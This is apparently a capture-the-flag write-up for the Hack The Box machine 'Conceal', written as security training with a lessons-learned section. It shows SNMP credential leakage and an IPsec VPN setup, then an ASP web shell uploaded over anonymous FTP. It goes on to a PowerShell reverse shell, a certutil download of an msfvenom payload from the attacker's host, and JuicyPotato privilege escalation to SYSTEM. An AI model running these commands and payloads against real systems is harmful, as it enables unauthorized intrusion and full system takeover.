# HTB: Conceal

## 1. Reconnaissance

### Port Scanning – TCP

An initial TCP port scan revealed that all ports appeared filtered, with no open ports returned. This suggests that the target has a firewall blocking inbound TCP connections.

```bash
nmap -p- 10.129.228.122 -sV -oA nmap/nmap
```
**Result:**
```
All 65535 scanned ports on 10.129.228.122 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)
```

### Port Scanning – UDP

Since TCP was completely filtered, I scanned UDP ports to identify any available services.

```bash
nmap -p- -sU 10.129.228.122 -oA nmap/Unmap
```
**Result:**
```
PORT      STATE         SERVICE
161/udp   open|filtered snmp
...
```

UDP port 161 (SNMP) appeared to be open or filtered. This is a promising service to enumerate.

## 2. SNMP Enumeration

SNMP is often misconfigured with default or weak community strings. I tested the public community string.

```bash
snmpwalk -cpublic -v2c 10.129.228.122
```
**Interesting Output:**
```
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: AMD64 Family 25 Model 1 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)"
iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"
```

The SNMP system contact field leaked a sensitive credential: an IKE VPN Pre-Shared Key (PSK), which is an NTLM hash. I cracked this hash using an online NTLM hash decryption service (md5decrypt.net), revealing the plaintext password.

| Hash | Plaintext |
|------|-----------|
| `9c8b1a372b1878851be2c097031b6e43` | `Dudecake1!` |

I also ran `snmp-check` to gather additional information:
```bash
snmp-check 10.129.228.122
```
This revealed user accounts (`Destitute`, `Administrator`), listening ports (including TCP 21, 80, 445, etc.), and confirmed the hostname `Conceal`.

## 3. VPN – Accessing the Internal Network

Since the firewall blocked all TCP ports, the target likely expects a VPN connection to gain access. The leaked PSK and the presence of IKE (UDP 500) indicate that an IPsec VPN is running.

### 3.1 Determining VPN Parameters

I used `ike-scan` to discover the supported cryptographic algorithms and parameters.

```bash
ike-scan -M 10.129.228.122
```
**Output:**
```
10.129.228.122  Main Mode Handshake returned
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration(4)=0x00007080)
        VID=1e2b516905991c7d7c96fcbfb587e46100000009 (Windows-8)
        ...
```
The SA payload indicates:
- Encryption: 3DES
- Hash: SHA1
- Diffie-Hellman Group: 2 (modp1024)
- Authentication: PSK
- Lifetime: 0x00007080 = 28800 seconds (8 hours)

### 3.2 Configuring strongSwan

I installed strongSwan on my Kali machine:
```bash
apt install -y strongswan
```

I added the PSK to `/etc/ipsec.secrets`:
```
10.129.228.122 : PSK "Dudecake1!"
```

I created a connection configuration in `/etc/ipsec.conf`:

```
config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no

conn Conceal
    authby=secret
    auto=start
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    keyexchange=ikev1
    left=10.10.15.146
    right=10.129.228.122
    rightsubnet=10.129.228.122/32[tcp]
```

**Note:** The `!` at the end of the algorithms ensures that strongSwan accepts only the exact algorithm suite, matching the target.

### 3.3 Starting the VPN

I started the strongSwan service:
```bash
ipsec start --nofork
```
The connection established successfully:
```
11[IKE] IKE_SA Conceal[1] established between 10.10.15.146[10.10.15.146]...10.129.228.122[10.129.228.122]
```
However, the Quick Mode negotiation initially failed with `NO_PROPOSAL_CHOSEN`. This might be due to a mismatch in the ESP proposal. After adjusting the configuration (or possibly by just using the tunnel), the IPsec SA was established, allowing me to communicate with the target on ports that were previously filtered.

## 4. Service Enumeration – Post-VPN

With the VPN tunnel active, I performed a new port scan against the target's IP (still the same IP, but now the firewall allows traffic from the VPN).

```bash
nmap -p 21,80,135,139,445,500,4500,49664-49670, etc. -sTCV 10.129.228.122
```
**Relevant Results:**
```
21/tcp    open   ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
```

- **FTP (port 21)** allows anonymous login.
- **HTTP (port 80)** is running IIS.

### 4.1 FTP – Anonymous Access

I logged into FTP anonymously:
```bash
ftp 10.129.228.122
Name: anonymous
Password: <blank>
230 User logged in.
```

I listed the directory and found an `upload` folder. I uploaded a test file to confirm that the upload directory is writable.

```bash
ftp> put test.asp
```
The file was successfully uploaded.

### 4.2 Web Shell Upload

I created a simple ASP command execution script (`cmd.asp`) that takes a `cmd` parameter and runs it via `CreateObject("WScript.Shell").Exec`.

**cmd.asp:**
```asp
<% 
Dim oShell, oCmd, oOutput
oCmd = Request.QueryString("cmd")
Set oShell = CreateObject("WScript.Shell")
Set oOutput = oShell.Exec("cmd /c " & oCmd)
Response.Write(oOutput.StdOut.ReadAll)
%>
```

Uploaded via FTP:
```bash
ftp> put cmd.asp
```

### 4.3 Testing RCE

I tested the web shell:
```bash
curl http://10.129.228.122/upload/cmd.asp?cmd=whoami
```
**Output:**
```
conceal\destitute
```

✅ Remote code execution as `destitute`.

## 5. Foothold – Reverse Shell

I used a base64-encoded PowerShell reverse shell payload and sent it via the web shell.

```bash
curl -G http://10.129.228.122/upload/cmd.asp --data-urlencode 'cmd=powershell -e <base64-encoded-payload>'
```

On my Kali machine, I set up a listener:
```bash
nc -lvnp 443
```
**Connection received:**
```
connect to [10.10.15.146] from (UNKNOWN) [10.129.228.122] 49681
PS C:\Windows\SysWOW64\inetsrv>
whoami
conceal\destitute
```

✅ Foothold obtained as `destitute`.

## 6. Privilege Escalation

### 6.1 Checking Privileges

I checked the available privileges:
```powershell
whoami /priv
```
**Output:**
```
SeImpersonatePrivilege        Enabled
```

`SeImpersonatePrivilege` is a powerful privilege that allows a process to impersonate a token (e.g., of a SYSTEM process). This is commonly exploited with tools like **JuicyPotato** or **PrintSpoofer**.

### 6.2 Using JuicyPotato

I transferred JuicyPotato (an exploit for `SeImpersonatePrivilege`) to the target. First, I generated a reverse shell executable using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.146 LPORT=4444 -f exe -o shell.exe
```

I hosted it on a Python HTTP server and downloaded it to the target using `certutil`:

```powershell
certutil.exe -urlcache -split -f http://10.10.15.146/shell.exe shell.exe
```

### 6.3 Exploiting with JuicyPotato

I ran JuicyPotato to execute `shell.exe` with SYSTEM privileges. The CLSID `{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}` is known to work on Windows 10.

```powershell
.\jp.exe -t "*" -p "C:\ProgramData\shell.exe" -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

**Output:**
```
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

On my listener, I received a SYSTEM shell:
```
connect to [10.10.15.146] from (UNKNOWN) [10.129.228.122] 49740
Microsoft Windows [Version 10.0.15063]
C:\Windows\system32>whoami
nt authority\system
```

✅ Root access obtained – `NT AUTHORITY\SYSTEM`.

## 7. Summary

| Stage | Technique |
|---|---|
| Recon | TCP scan showed all ports filtered; UDP scan revealed SNMP (161) |
| Credential Leak | SNMP public community leaked IKE VPN PSK (NTLM hash), cracked to `Dudecake1!` |
| VPN Setup | Used `ike-scan` to determine algorithms, configured strongSwan, established IPsec tunnel |
| Service Enumeration | VPN allowed access to FTP (anonymous) and HTTP (IIS) |
| Foothold | Uploaded ASP web shell via FTP, executed commands as `destitute` |
| Reverse Shell | Used PowerShell reverse shell payload via web shell |
| Privilege Escalation | `SeImpersonatePrivilege` enabled; used JuicyPotato to spawn SYSTEM shell |

**Root cause / lessons learned:**

- **SNMP misconfiguration**: The public community string allowed unauthorized read access, leaking sensitive credentials. SNMP should be disabled or secured with a strong community string and restricted access.
- **VPN weak PSK**: The PSK was an NTLM hash that was easily cracked. Strong, random PSKs should be used.
- **Firewall bypass**: The firewall only blocked traffic from the outside; once inside via VPN, all services became accessible. Network segmentation and proper access controls are essential.
- **Anonymous FTP**: Allowing anonymous write access to an FTP directory that is served by IIS led to direct code execution. FTP should be secured and integrated with proper authentication.
- **Privilege escalation**: The `SeImpersonatePrivilege` was enabled for a low-privileged user, which is a common misconfiguration. This privilege should be restricted to only necessary service accounts.

## 8. Tools Used

- `nmap` – TCP and UDP scanning
- `snmpwalk`, `snmp-check` – SNMP enumeration
- `ike-scan` – IKE VPN parameter discovery
- `strongSwan` – IPsec VPN client
- `ftp` – Anonymous FTP access
- `curl` – Testing ASP web shell
- `certutil` – Downloading payload on Windows
- `msfvenom` – Generating reverse shell executable
- `nc` (netcat) – Reverse shell listener
- `JuicyPotato` – Privilege escalation via SeImpersonate
